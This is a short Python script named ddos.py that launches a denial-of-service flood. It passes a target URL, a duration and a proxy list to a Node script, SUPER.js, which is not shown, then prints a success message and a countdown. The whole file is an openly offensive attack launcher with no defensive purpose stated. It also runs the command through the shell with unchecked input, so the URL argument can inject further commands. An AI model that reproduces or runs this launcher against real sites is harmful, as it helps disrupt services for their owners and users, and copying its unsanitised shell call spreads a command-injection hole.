# ddos.py

import sys
import subprocess
import time

def main(url, duration):
    command = f"node SUPER.js {url} {duration} 9 5 proxy.txt"

    try:
        subprocess.run(command, shell=True, check=True)
        print(f"Successfully Attack To {url}")
        print(f"Time: {duration}")

        # Countdown timer
        for remaining in range(duration, 0, -1):
            print(f"Countdown: {remaining} seconds", end="\r")
            time.sleep(1)
        print("\nAttack completed.")
        
    except subprocess.CalledProcessError as e:
        print(f"Error running command: {e}")
        return

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 ddos.py <url> <duration>")
    else:
        url = sys.argv[1]
        duration = int(sys.argv[2])
        main(url, duration)
